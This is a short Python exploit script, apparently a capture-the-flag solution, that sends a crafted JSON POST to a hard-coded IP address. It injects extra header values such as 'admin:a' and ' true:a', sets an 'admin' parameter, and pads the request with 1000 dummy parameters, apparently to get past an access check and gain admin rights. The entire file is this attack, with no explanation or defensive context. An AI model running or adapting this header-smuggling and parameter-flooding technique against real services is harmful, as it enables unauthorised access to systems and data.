import json
import requests

url = "http://61.147.171.105:60110/"
datas = {"headers": ["admin:a"," true:a", "Content-Type: application/json"],"params": {"admin": "akali"}}
for i in range(1000):
    datas["params"]["x" + str(i)] = i

headers = {
    "Content-Type": "application/json"
}

json1 = json.dumps(datas)
resp = requests.post(url, headers=headers, data=json1)
print(resp.content)

